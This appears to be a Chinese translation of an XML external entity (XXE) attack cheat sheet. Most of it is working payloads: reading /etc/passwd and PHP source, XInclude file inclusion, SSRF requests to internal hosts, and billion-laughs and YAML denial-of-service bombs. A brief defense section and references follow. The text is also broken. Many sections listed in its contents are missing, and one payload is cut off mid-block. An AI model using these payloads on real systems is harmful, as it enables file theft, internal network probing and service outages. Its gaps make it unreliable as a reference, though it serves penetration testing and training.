# XML 外部实体注入 (XXE)

> XML 外部实体攻击（XXE）是一种针对解析XML输入并允许XML实体的应用程序的攻击。XML实体可用于指示XML解析器获取服务器上的特定内容。

## XXE 攻击原理

XML 外部实体注入（XXE）是一种安全漏洞，当应用程序解析恶意构造的XML输入时，攻击者可以利用外部实体引用功能读取服务器上的任意文件、执行服务器端请求伪造（SSRF）攻击、端口扫描内部网络，甚至可能导致拒绝服务（DoS）攻击。

### 漏洞成因

1. **不安全的XML解析器配置**：默认启用外部实体解析
2. **未经验证的用户输入**：直接将用户控制的XML输入传递给XML解析器
3. **过时的XML库**：使用存在已知漏洞的XML处理库
4. **功能滥用**：不必要地启用DTD处理功能

### 攻击面

- **文件读取**：读取服务器上的敏感文件（如`/etc/passwd`）
- **SSRF攻击**：发起服务器端请求，扫描内网
- **拒绝服务**：通过实体扩展消耗服务器资源
- **端口扫描**：探测内部网络服务
- **远程代码执行**：在某些特定配置下可能实现RCE

### 影响

- 敏感信息泄露
- 内部网络探测
- 拒绝服务
- 可能的远程代码执行
- 业务逻辑绕过

## 目录

- [工具](#工具)
- [检测漏洞](#检测漏洞)
- [利用XXE读取文件](#利用xxe读取文件)
    - [经典XXE](#经典xxe)
    - [Base64编码的XXE](#base64编码的xxe)
    - [PHP包装器中的XXE](#php包装器中的xxe)
    - [XInclude攻击](#xinclude攻击)
- [利用XXE执行SSRF攻击](#利用xxe执行ssrf攻击)
- [利用XXE执行拒绝服务攻击](#利用xxe执行拒绝服务攻击)
    - [十亿次笑攻击](#十亿次笑攻击)
    - [YAML攻击](#yaml攻击)
    - [参数笑攻击](#参数笑攻击)
- [利用基于错误的XXE](#利用基于错误的xxe)
    - [基于错误 - 使用本地DTD文件](#基于错误---使用本地dtd文件)
        - [Linux本地DTD](#linux本地dtd)
        - [Windows本地DTD](#windows本地dtd)
    - [基于错误 - 使用远程DTD](#基于错误---使用远程dtd)
- [利用盲注XXE进行带外数据泄露](#利用盲注xxe进行带外数据泄露)
    - [基础盲注XXE](#基础盲注xxe)
    - [带外XXE](#带外xxe)
    - [使用DTD和PHP过滤器的XXE OOB](#使用dtd和php过滤器的xxe-oob)
    - [使用Apache Karaf的XXE OOB](#使用apache-karaf的xxe-oob)
- [WAF绕过](#waf绕过)
    - [通过字符编码绕过](#通过字符编码绕过)
    - [JSON端点上的XXE](#json端点上的xxe)
- [非常见文件中的XXE](#非常见文件中的xxe)
    - [SVG中的XXE](#svg中的xxe)
    - [SOAP中的XXE](#soap中的xxe)
    - [DOCX文件中的XXE](#docx文件中的xxe)
    - [XLSX文件中的XXE](#xlsx文件中的xxe)
    - [DTD文件中的XXE](#dtd文件中的xxe)
- [实验](#实验)
- [防御措施](#防御措施)
- [参考资料](#参考资料)

## 工具

- [staaldraad/xxeftp](https://github.com/staaldraad/xxeserv) - 支持FTP的XXE有效载荷微型Web服务器
- [lc/230-OOB](https://github.com/lc/230-OOB) - 通过FTP检索文件内容的带外XXE服务器，支持通过[xxe.sh](http://xxe.sh/)生成有效载荷
- [enjoiz/XXEinjector](https://github.com/enjoiz/XXEinjector) - 使用直接和不同带外方法自动利用XXE漏洞的工具
- [BuffaloWill/oxml_xxe](https://github.com/BuffaloWill/oxml_xxe) - 将XXE/XML漏洞利用嵌入不同文件类型的工具(DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG, GIF)
- [whitel1st/docem](https://github.com/whitel1st/docem) - 在docx,odt,pptx等文件中嵌入XXE和XSS有效载荷的实用程序
- [bytehope/wwe](https://github.com/bytehope/wwe) - PoC工具(基于wrapwrap和lightyear)演示仅设置LIBXML_DTDLOAD或LIBXML_DTDATTR标志时PHP中的XXE

## 检测漏洞

**内部实体**：如果在DTD内声明实体，则称为内部实体。
语法：`<!ENTITY 实体名 "实体值">`

**外部实体**：如果在DTD外声明实体，则称为外部实体。通过`SYSTEM`标识。
语法：`<!ENTITY 实体名 SYSTEM "实体值">`

基本实体测试，当XML解析器解析外部实体时，结果应在`firstName`中包含"John"，在`lastName`中包含"Doe"。实体在`DOCTYPE`元素内定义。

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```

在发送XML有效载荷到服务器时，设置`Content-Type: application/xml`可能会有所帮助。

## 利用XXE读取文件

### 经典XXE

尝试显示`/etc/passwd`文件内容。

```xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
```

:warning: `SYSTEM`和`PUBLIC`几乎是同义词。

```xml
<!ENTITY % xxe PUBLIC "随机文本" "URL">
<!ENTITY xxe PUBLIC "任意文本" "URL">
```

### Base64编码的XXE

```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

### PHP包装器中的XXE

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <address>42 rue du CTF</address>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3" >
]>
<foo>&xxe;</foo>
```

### XInclude攻击

当无法修改**DOCTYPE**元素时，使用**XInclude**来定位

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## 利用XXE执行SSRF攻击

XXE可以与[SSRF漏洞](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)结合，针对网络上的其他服务。

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "http://internal.service/secret_pass.txt" >
]>
<foo>&xxe;</foo>
```

## 利用XXE执行拒绝服务攻击

:warning: 这些攻击可能会使服务或服务器崩溃，请勿在生产环境中使用。

### 十亿次笑攻击

```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

### YAML攻击

```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```

### 参数笑攻击

十亿次笑攻击的变体，使用参数实体的延迟解释，由Sebastian Pipping开发。

```xml
<!DOCTYPE r [
  <!ENTITY % pe_1 "<!---->">
  <!ENTITY % pe_2 "&#37;pe_1;<!---->&#37;pe_1;">
```

## 防御措施

### 禁用外部实体处理
- 在XML解析器中禁用DTD处理
- 禁用外部实体引用
- 禁用XInclude处理

### 输入验证
- 验证所有XML输入
- 使用白名单验证允许的字符和格式
- 拒绝包含`<!DOCTYPE`或`<!ENTITY`的输入

### 安全配置
- 使用最新版本的XML处理库
- 应用安全补丁
- 配置XML解析器以限制潜在的危险操作

### 安全开发实践
- 避免使用XML解析器处理不受信任的输入
- 使用更安全的替代方案，如JSON
- 实施内容安全策略（CSP）
- 定期进行安全审计和代码审查

### 其他防护措施
- 实施Web应用防火墙（WAF）规则检测和阻止XXE攻击
- 监控和记录可疑的XML处理活动
- 对敏感操作实施访问控制

## 参考资料

- [OWASP XXE 防护手册](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [XXE 攻击与防御 - 深度解析](https://portswigger.net/web-security/xxe)
- [XXE 实战指南 - 2023年更新](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
- [CVE-2019-8986: TIBCO JasperReports Server 中的SOAP XXE - Julien Szlamowicz, Sebastien Dudek - 2019年3月11日](https://www.synacktiv.com/ressources/advisories/TIBCO_JasperReports_Server_XXE.pdf)
- [在加固服务器上使用XXE进行数据泄露 - Ritik Singh - 2022年1月29日](https://infosecwriteups.com/data-exfiltration-using-xxe-on-a-hardened-server-ef3a3e5893ac)
- [检测和利用SAML接口中的XXE - Christian Mainka - 2014年11月6日](http://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html)
- [利用文件上传功能中的XXE - Will Vandevanter - 2015年11月19日](https://www.blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf)
- [利用Excel进行XXE攻击 - Marc Wickenden - 2018年11月12日](https://www.4armed.com/blog/exploiting-xxe-with-excel/)
